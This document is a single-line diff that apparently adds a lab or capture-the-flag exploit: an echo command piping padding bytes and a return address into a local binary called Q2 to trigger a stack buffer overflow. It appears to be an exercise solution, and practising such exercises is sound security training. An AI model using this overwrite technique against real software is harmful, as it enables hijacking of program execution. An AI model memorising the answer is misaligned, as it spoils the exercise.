@@ -1,0 +1,1 @@
+echo -e 'AAAAAAAAAAAAAAAAAA\x36\x11\x40\x00\x00\x00\x00\x00' | ./Q2
